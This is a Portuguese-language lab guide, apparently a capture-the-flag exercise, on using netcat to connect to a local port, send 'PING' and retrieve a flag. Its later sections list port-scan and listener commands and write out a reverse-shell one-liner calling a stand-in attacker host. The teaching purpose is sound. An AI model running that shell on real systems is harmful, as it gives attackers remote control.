# Conexões Manuais com Netcat (Sockets TCP Puros & Banner Grabbing)

## 1. Briefing da Missão
Operador, a infraestrutura de telemetria da Cyberguard ativou um serviço de comando e controle na porta TCP `31337` da interface local (`127.0.0.1`). O serviço não utiliza interfaces web nem protocolos pesados; ele exige um aperto de mão direto em camada de transporte através de socket bruto.

Sua missão tática é:
1. Iniciar o serviço local `/challenge/net-nc-raw-socket`.
2. Utilizar o utilitário `nc` (netcat) para se conectar à porta `31337`.
3. Interagir com o protocolo do servidor, enviar a instrução de verificação `PING` e resgatar a flag.

---

## 2. Teoria Aprofundada

### 2.1 Netcat: O Canivete Suíço do TCP/IP
O `netcat` (invocado pelo comando `nc`) é uma ferramenta fundamental em segurança ofensiva e defensiva. Diferente de navegadores web ou clientes SSH que encapsulam os dados em protocolos complexos da Camada de Aplicação (Camada 7 do modelo OSI), o netcat abre um canal de leitura e escrita direto sobre a Camada de Transporte (Camada 4 — TCP ou UDP).

```
   [ Aplicação / Operador ]
             │ (Bytes puros via stdin / stdout)
             ▼
   [ Netcat (nc) ]
             │ (Criação de socket TCP AF_INET / SOCK_STREAM)
             ▼
   [ Camada de Transporte TCP/IP ]
             │ (Handshake SYN -> SYN-ACK -> ACK)
             ▼
   [ Conexão Estabelecida na Porta 31337 ]
```

### 2.2 Tabela Comparativa de Ferramentas de Rede

| Ferramenta | Camada OSI Principal | Propósito Primário | Overhead de Protocolo |
| :--- | :---: | :--- | :---: |
| **Netcat (`nc`)** | Camada 4 (Transporte) | Conexão TCP/UDP bruta, listeners, reverse shells | **Zero** (transmite bytes exatos) |
| **Curl (`curl`)** | Camada 7 (Aplicação) | Requisições HTTP, HTTPS, FTP, REST APIs | Médio (cabeçalhos HTTP obrigatórios) |
| **Telnet (`telnet`)** | Camada 7 (Aplicação) | Terminal remoto legador (sem criptografia) | Baixo (negocia opções de terminal IAC) |
| **SSH (`ssh`)** | Camada 7 (Aplicação) | Shell remoto seguro criptografado | Alto (criptografia assimétrica e simétrica) |

### 2.3 Relação com o Diagnóstico da Cyberguard
No relatório diagnóstico, constatou-se que grande parte da equipe dependia exclusivamente de navegadores ou ferramentas automatizadas com interface gráfica, sem intimidade com diálogos de terminal em portas desconhecidas. O domínio do netcat liberta o operador para auditar qualquer protocolo legado ou proprietário.

---

## 3. Passo a Passo de Resolução

1. **Abra o primeiro terminal e inicie o listener do desafio:**
   ```bash
   /challenge/net-nc-raw-socket
   ```
   *O terminal informará que o socket está aberto e aguardando conexão em `127.0.0.1:31337`.*

2. **Abra um segundo terminal (ou utilize tmux / background):**
   Conecte-se à porta do serviço usando o netcat:
   ```bash
   nc 127.0.0.1 31337
   ```

3. **Interaja com o prompt de autenticação:**
   O servidor exibirá o banner operacional e solicitará:
   ```text
   [*] Envie a palavra 'PING' para validar a integridade do canal:
   > 
   ```
   Digite:
   ```text
   PING
   ```
   Pressione `Enter`.

4. **Recebimento da Flag e Debriefing:**
   O servidor responderá com `PONG!`, exibirá o debriefing técnico e transmitirá a flag diretamente na sua sessão do netcat!

---

## 4. Dicas e Comandos de Terminal

| Comando | Descrição Operacional |
| :--- | :--- |
| `nc 127.0.0.1 31337` | Conecta ao IP e porta indicados em TCP. |
| `nc -lvnp 4444` | Inicia um listener local aguardando conexões de entrada (típico em reverse shells). |
| `nc -zv 127.0.0.1 20-100` | Realiza um port scan rápido e silencioso na faixa de portas. |
| `ss -tlpn` | Inspeciona todas as portas TCP que estão escutando conexões no sistema local. |
| `lsof -i :31337` | Identifica o processo e o usuário que estão utilizando a porta 31337. |

---

## 5. Aplicação Prática no Mundo Real

* **Reverse Shells em Red Team:** O netcat é a ferramenta clássica para receber conexões reversas de alvos explorados:
  ```bash
  # Na máquina do atacante:
  nc -lvnp 9001
  # No alvo comprometido:
  bash -i >& /dev/tcp/atacante/9001 0>&1
  ```
* **Banner Grabbing & Diagnóstico em Blue Team:** Permite identificar a versão exata de daemons de email (SMTP na porta 25), servidores web ou roteadores industriais que expõem portas sem documentação.
